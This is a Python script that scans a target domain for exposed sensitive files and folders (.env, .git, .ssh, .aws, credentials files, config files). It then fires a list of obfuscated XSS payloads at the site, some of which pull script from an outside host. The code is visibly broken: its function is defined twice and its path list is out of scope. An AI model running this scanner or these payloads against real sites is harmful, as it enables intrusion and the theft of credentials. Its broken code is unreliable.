import requests
from colorama import Fore, Style

fg = Fore.GREEN
fr = Fore.RED
fw = Fore.WHITE
fy = Fore.YELLOW
fo = Fore.LIGHTYELLOW_EX
flc = Fore.CYAN
bd = Style.BRIGHT
res = Style.RESET_ALL

def check_file_uploads_and_xss(domain, cookies, headers):
    paths = [
    '/upload/', '/file-upload/', '/uploads/', '/admin/upload/', '/admin/file-upload/',
    '/.git/', '/.env', '/config.php', '/wp-config.php', '/app/etc/env.php', '/app/etc/config.php',
    '/.htaccess', '/.htpasswd', '/config/database.yml', '/config/secrets.yml', '/composer.json',
    '/composer.lock', '/package.json', '/package-lock.json', '/.babelrc', '/.gitignore', '/.gitattributes',
    '/.npmrc', '/.yarnrc', '/phpinfo.php', '/info.php', '/test.php', '/debug.php', '/.DS_Store',
    '/backups/', '/backup/', '/backups.zip', '/backup.zip', '/private/', '/temp/', '/tmp/', '/logs/',
    '/conf/', '/src/', '/var/', '/lib/', '/.well-known/', '/.idea/', '/.vscode/', '/node_modules/',
    '/bower_components/', '/vendor/', '/public/', '/static/', '/media/', '/images/', '/assets/', '/secret/',
    '/hidden/', '/admin/config.php', '/admin/backup/', '/admin/secrets/', '/database/', '/database_backup/',
    '/env/', '/config/', '/credentials/', '/keys/', '/ssl/', '/certs/', '/certificates/', '/private_keys/',
    '/.ssh/', '/.aws/', '/.azure/', '/.gcp/', '/credentials.json', '/key.json', '/access_tokens/',
    '/session_tokens/', '/tokens/', '/private_data/', '/user_data/', '/account_data/', '/user_info/', 
    '/userinfo/', '/account_info/', '/secret_files/', '/config_files/', '/backup_files/', '/database_files/',
    '/logs/', '/log_files/', '/error_logs/', '/access_logs/', '/debug_logs/', '/debug_files/', '/tmp_files/',
    '/temporary_files/', '/temp_data/', '/temp_storage/', '/upload_data/', '/upload_files/'
]

xss_payloads = [
    "<script>alert('XSS');</script>",
    "<img src=x onerror=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS');></iframe>",
    '\'"</Script><Html Onmouseover=(confirm)()//',
    '<imG/sRc=l oNerrOr=(prompt)() x>',
    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
    '<deTails open oNToggle=confi\u0072m()>',
    '<img sRc=l oNerrOr=(confirm)() x>',
    '<svg/x=">"/onload=confirm()//',
    '<svg%0Aonload=%09((pro\u006dpt))()//',
    '<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>',
    '<sCript x>confirm``</scRipt x>',
    '<Script x>prompt()</scRiPt x>',
    '<sCriPt sRc=//14.rs>',
    '<embed//sRc=//14.rs>',
    '<base href=//14.rs/><script src=/>',
    '<object//data=//14.rs>',
    '<s=" onclick=confirm``>clickme',
    '<svG oNLoad=co\u006efirm&#x28;1&#x29>',
    '\'"><y///oNMousEDown=((confirm))()>Click',
    '<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
    '<img src=x onerror=confir\u006d`1`>',
    '<svg/onload=co\u006efir\u006d`1`>'
]

def check_file_uploads_and_xss(domain, cookies, headers):
    for path in paths:
        url = domain + path
        try:
            response = requests.get(url, headers=headers, cookies=cookies, verify=False, allow_redirects=True, timeout=10)
            if response.status_code == 200:
                print(f"{fg}[+] Sensitive file or directory found: {path}{fw}")
            else:
                print(f"{fy}[-] Path not found or not accessible: {path}{fw}")
        except requests.exceptions.RequestException as e:
            print(f"{fr}[-] Error checking path {path}: {e}{fw}")

    for payload in xss_payloads:
        try:
            response = requests.get(f"{domain}/?q={payload}", headers=headers, cookies=cookies, verify=False, timeout=10)
            if payload in response.text:
                print(f"{fg}[+] XSS vulnerability detected with payload: {payload}{fw}")
            else:
                print(f"{fy}[-] No XSS vulnerability detected with payload: {payload}{fw}")
        except requests.exceptions.RequestException as e:
            print(f"{fr}[-] Error checking XSS vulnerability with payload {payload}: {e}{fw}")
